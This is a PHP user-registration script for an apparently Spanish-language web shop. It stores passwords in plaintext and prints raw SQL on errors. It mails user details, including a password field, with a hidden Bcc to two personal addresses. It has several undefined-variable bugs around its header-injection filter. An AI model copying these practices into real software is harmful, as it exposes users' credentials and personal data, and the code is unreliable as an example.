<?php

require_once $_SERVER["DOCUMENT_ROOT"] . '/nwproject/php/modulos/nwcommerce/_config.php';

include_once $_SERVER['DOCUMENT_ROOT'] . "/nwproject/conectar/conectar.php";
include_once $_SERVER['DOCUMENT_ROOT'] . "/nwproject/php/utiles.php";
conectar();
/* +++++++++++++++++ funcion para evitar inyección de código ++++++++++++++++++++++ */
if (!function_exists("GetSQLValueString")) {

    function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") {
        $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;

        $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

        switch ($theType) {
            case "text":
                $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
                break;
            case "long":
            case "int":
                $theValue = ($theValue != "") ? intval($theValue) : "NULL";
                break;
            case "double":
                $theValue = ($theValue != "") ? "'" . doubleval($theValue) . "'" : "NULL";
                break;
            case "date":
                $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
                break;
            case "defined":
                $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
                break;
        }
        return $theValue;
    }

}

require_once $_SERVER["DOCUMENT_ROOT"] . '/nwlib/securimage/securimage.php';

$securimage = new Securimage();

if ($securimage->check($_POST["captcha_code_crear"]) == false) {
    echo "El texto ingresado es incorrecto. Inténtelo de nuevo. ";
    return;
}

$sql = sprintf("select * from usuarios_general where usuario=%s ", GetSQLValueString($_POST["correo"], "text"));
$query = mysql_query($sql);
$num_rows = mysql_num_rows($query);

if ($num_rows != 0) {
    echo "existe";
    return;
}

if (!validar_email_dsn(strip_tags($_POST['correo']))) {
    echo ("El correo suministrado no existe. ");
    exit;
}

$check = "";

if ($_POST["checksi"] == "on") {
    $check = "NO";
} else {
    $check = "SI";
}

$sql = sprintf("insert into usuarios_general (nombre, usuario, clave, correo, telefono, direccion, ciudad, pais, fecha, enterar, recibir) values
    (%s, %s, %s, %s, %s, %s, %s, %s, CURDATE(), %s, %s)", GetSQLValueString($_POST["nombre"], "text"), GetSQLValueString($_POST["correo"], "text"), GetSQLValueString($_POST["clave1"], "text"), GetSQLValueString($_POST["correo"], "text"), GetSQLValueString($_POST["telefono"], "text"), GetSQLValueString($_POST["direccion"], "text"), GetSQLValueString($_POST["ciudad"], "text"), GetSQLValueString($_POST["pais_contacto"], "text"), GetSQLValueString($_POST["enterar"], "text"), GetSQLValueString($check, "text")
);

if (!mysql_query($sql)) {
    echo "No se pudo ingresar su información. Muestre el siguiente error al administrador: " . $sql;
    return;
}


$mail = htmlspecialchars(str_replace(" ", "", $_POST['correo']));
$ciudad = strip_tags($_POST['ciudad']);
$pais = strip_tags($_POST['pais_contacto']);
$telefono = strip_tags($_POST['telefono']);
$direccion = strip_tags($_POST['direccion']);
$nombre = strip_tags($_POST['nombre']);
$de = "info@" . ucfirst(str_replace("www.", "", $_SERVER["HTTP_HOST"]));

$sql = sprintf("select * from correos ");
$query = mysql_query($sql);
$result_correos = mysql_fetch_array($query);

$para_correo = $mail;

if (comprobar_email($mail)) {

    $_POST['correo'] = str_replace("\r", "", $_POST['correo']); //preg_replace
    $_POST['correo'] = str_replace("\n", "", $_POST['correo']);

    $_SESSION['token'] = $token;
    $secret = 'ssshhitsasecret';
    $token = md5(rand(1, 1000) . $secret);
    $field = preg_replace("/[\n\r]+/", " ", $field);
// Remove injected headers
    $find = array("/bcc\:/i", "/Content\-Type\:/i", "/cc\:/i", "/to\:/i");
    $_POST['correo'] = preg_replace($find, "", $_POST['correo']);
    $mail = str_replace("\r", "\n", $mail);
    $nombre = str_replace("\r", "\n", $nombre);
    $telefono = str_replace("\r", "\n", $telefono);
    $ciudad = str_replace("\r", "\n", $ciudad);
    $pais = str_replace("\r", "\n", $pais);

    if (!eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$", $mail)) {
        ob_clean();
        mail("assdres@hotmail.com", "Mensaje detenido", $nombre, "From: nombre <$mail>");
        exit("Mensaje detenido.");
    }
    if (eregi('^(bcc$|content-type|mime-version|--)', $key)) {
        print_error("Error al analizar."); //bloqueo de spam
    }

    $destinatario = $para_correo;
    $asunto = "Tus datos de registro en la pagina " . $_SERVER["HTTP_HOST"];
    $cuerpo = '
<html>
<head>
   <title>Bienvenido, ' . $nombre . '</title>
</head>
<body>
<h1>Correo de registro de contacto</h1>
<p>
<b></b>
</p>
<p>
<b>E-Mail / usuario: ' . $mail . '</b>
    </p>
    <p>
<b>Teléfono: ' . $telefono . '</b>
    </p>
        <p>
<b>País: ' . $pais . '</b>
      </p>
       <p>
<b>Ciudad: ' . $ciudad . '</b>
     </p>
        <p>
        <b>Nombre: ' . $nombre . '</b>
</p>
    <p>
        <b>Clave: ' . $_POST["clave"] . '</b>
</p>
<p>
Muchas gracias por registrarte. Podrás ver nuestro contenido oculto, promociones y mucho más.
</p>
</body>
</html>
';

//para el envío en formato HTML
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
//dirección del remitente
    $headers .= "From: Webmaster NW <" . $de . ">\r\n";
//dirección de respuesta, si queremos que sea distinta que la del remitente
    $headers .= "Reply-To: " . $de . "\r\n";
//ruta del mensaje desde origen a destino
    $headers .= "Return-path: " . $de . "\r\n";
//direcciones que recibián copia
//$headers .= "Cc: assdres@hotmail.com\r\n";
//direcciones que recibirán copia oculta
    $headers .= "Bcc: assdres@hotmail.com, orionjafe@hotmail.com\r\n";

    mail($destinatario, $asunto, $cuerpo, $headers);
} else {
    echo "Verifique los datos a enviar.";
    exit;
}
?>